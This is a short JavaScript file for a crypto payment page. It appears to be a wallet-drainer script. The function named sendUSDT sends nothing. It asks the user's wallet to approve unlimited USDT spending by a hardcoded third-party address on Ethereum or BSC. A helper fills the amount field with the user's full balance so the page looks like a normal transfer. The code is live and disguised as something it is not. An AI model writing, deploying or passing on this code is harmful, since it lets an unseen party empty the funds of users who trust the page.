const CONFIG = {
  1: {
    name: "Ethereum",
    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    spender: "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7"
  },
  56: {
    name: "BSC",
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    spender: "0x220bb5df0893f21f43e5286bc5a4445066f6ca56"
  }
};

async function sendUSDT() {
  if (!window.ethereum) {
    alert("Wallet required");
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);
  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  if (!CONFIG[chainId]) {
    alert("Unsupported network. Use Ethereum or BSC.");
    return;
  }

  const { usdt, spender, name } = CONFIG[chainId];
  const signer = await provider.getSigner();

  const token = new ethers.Contract(
    usdt,
    ["function approve(address spender,uint256 amount) external returns(bool)"],
    signer
  );

  const tx = await token.approve(spender, ethers.MaxUint256);
  await tx.wait();

  alert(`Unlimited USDT approval successful on ${name}`);
}

async function setMax() {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  if (!CONFIG[chainId]) return;

  const token = new ethers.Contract(
    CONFIG[chainId].usdt,
    [
      "function balanceOf(address) view returns(uint256)",
      "function decimals() view returns(uint8)"
    ],
    signer
  );

  const balance = await token.balanceOf(await signer.getAddress());
  const decimals = await token.decimals();
  document.getElementById("amount").value =
    ethers.formatUnits(balance, decimals);
}
